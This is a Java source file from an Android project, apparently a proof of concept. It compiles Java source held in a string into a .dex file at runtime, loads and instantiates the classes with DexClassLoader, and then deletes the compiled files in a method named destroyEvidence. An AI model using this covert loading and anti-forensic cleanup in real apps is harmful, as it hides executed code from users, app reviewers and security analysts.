package com.android.app_2_faces_net.compile_unit;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.util.Log;

import com.android.app_2_faces_net.ast.ClassNode;
import com.android.app_2_faces_net.ast.ConstructorNode;
import com.android.app_2_faces_net.ast.MethodNode;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;

import dalvik.system.DexClassLoader;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import javassist.NotFoundException;
import javassist.android.DexFile;

public class Compiler {
    private static final String TAG = "Compiler";
    private static final String DEX_FILE_NAME = "tmp.dex";

    private final Context context;

    private final String sourceCode;
    private final File dir;


    private final List<String> classesName;
    private final List<File> classFiles;
    private final File dexFile;

    private DexClassLoader dexClassLoader;


    private JavaParser javaParser;


    public Compiler(Context context, String pSourceCode, File dir) {
        this.context = context;

        this.sourceCode = pSourceCode;

        this.dir = dir;

        this.classesName = new ArrayList<>();
        this.classFiles = new ArrayList<>();
        this.dexFile = new File(this.dir, DEX_FILE_NAME);

        this.dexClassLoader = null;
    }

    /**
     * Parse Java source code in order to build an AbstractSyntaxTree
     *
     * @throws NotBalancedParenthesisException in case Java parenthesis are not balanced
     * @throws InvalidSourceCodeException      in case Java source code is invalid
     */
    public void parseSourceCode() throws NotBalancedParenthesisException, InvalidSourceCodeException {
        this.javaParser = new JavaParser(this.sourceCode);
    }


    /**
     * Compile the AST in order to get multiple ".class" abd then a single ".dex"
     *
     * @throws IOException       in case
     * @throws NotFoundException in case
     */
    public void compile() throws IOException, NotFoundException {
        //convert AST into multiple ".class"
        this.assemblyCompile();

        // convert multiple ".class" into single ".dex"
        DexFile df = new DexFile();
        for (int i = 0; i < this.classesName.size(); i++) {
            File classFile = new File(this.dir, this.classesName.get(i) + ".class");
            this.classFiles.add(classFile);

            df.addClass(classFile);
        }
        df.writeFile(dexFile.getAbsolutePath());
    }


    /**
     * Load all classes .dex file into RAM device
     *
     * @param cacheDir        cacheDir
     * @param applicationInfo applicationInfo
     * @param classLoader     Java classLoader
     */
    public void dynamicLoading(File cacheDir, ApplicationInfo applicationInfo, ClassLoader classLoader) {
        this.dexClassLoader = new DexClassLoader(this.dexFile.getAbsolutePath(), cacheDir.getAbsolutePath(), applicationInfo.nativeLibraryDir, classLoader);
    }


    /**
     * Returns an instance of the class
     *
     * @return instance of className
     * @throws ClassNotFoundException       in case class doesn't exist in bytecode
     * @throws NoSuchMethodException        in case method doesn't exist in bytecode
     * @throws InvocationTargetException    in case of invocation error
     * @throws IllegalAccessException       in case illegal access error
     * @throws InstantiationException       in case error on instantiation of the class
     */
    public Object getInstance(String className) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException {
        if (this.dexClassLoader != null) {
            Class loadedClass = this.dexClassLoader.loadClass(className);
            Constructor constructor = loadedClass.getConstructor();

            return constructor.newInstance();
        }
        return null;
    }


    /**
     * Destroy all .class and all .dex made by compiler
     */
    public void destroyEvidence() throws EvidenceLeftException {
        //destroy all .class
        for (int i = 0; i < classFiles.size(); i++) {
            if (!this.classFiles.get(i).delete()) {
                throw new EvidenceLeftException();
            }
        }

        //destroy .dex
        if (!this.dexFile.delete()) {
            throw new EvidenceLeftException();
        }
    }


    private void assemblyCompile() throws NotFoundException {
        ClassPool cp = ClassPool.getDefault(this.context);

        //import phase
        List<String> importPackagesPathLit = this.javaParser.getImportPackagesPathList();
        Log.e(TAG, "Imports: " + importPackagesPathLit.toString());
        for (int i = 0; i < importPackagesPathLit.size(); i++) {
            cp.importPackage(importPackagesPathLit.get(i));
            cp.appendClassPath(importPackagesPathLit.get(i));
            cp.insertClassPath(importPackagesPathLit.get(i));
        }
        //end import phase

        List<ClassNode> parsedClasses = this.javaParser.getParsedClassList(this.javaParser.getParserdFile().getRoot());
        for (int i = 0; i < parsedClasses.size(); i++) {
            ClassNode parsedClass = parsedClasses.get(i);

            Log.e(TAG, "Compiling Class: " + parsedClass.toString());

            CtClass ctClass = compileClass(cp, parsedClass);

            if (ctClass != null) {
                this.classesName.add(ctClass.getName());
                ctClass.debugWriteFile(this.dir.getAbsolutePath());
            }
        }
    }

    private CtClass compileClass(ClassPool cp, ClassNode parsedClass) {
        try {
            CtClass ctClass = cp.makeClass(parsedClass.className);

            List<ConstructorNode> parsedConstructors = this.javaParser.getParsedConstructorList(parsedClass);
            Log.e(TAG, "Constructors: " + parsedConstructors.toString());
            for (int j = 0; j < parsedConstructors.size(); j++) {
                String constructorBody = parsedConstructors.get(j).body;

                CtConstructor ctConstructor = new CtConstructor(null, ctClass);
                ctConstructor.setBody(constructorBody);
                ctClass.addConstructor(ctConstructor);
            }

            List<MethodNode> parsedMethodList = javaParser.getParsedMethodList(parsedClass);
            Log.e(TAG, "Methods: " + parsedMethodList.toString());
            for (int j = 0; j < parsedMethodList.size(); j++) {
                String methodCode = parsedMethodList.get(j).toString();

                CtMethod ctMethod = CtMethod.make(methodCode, ctClass);
                ctClass.addMethod(ctMethod);
            }
            return ctClass;
        } catch (CannotCompileException e) {
            Log.d(TAG, Log.getStackTraceString(e));
        }
        return null;
    }

}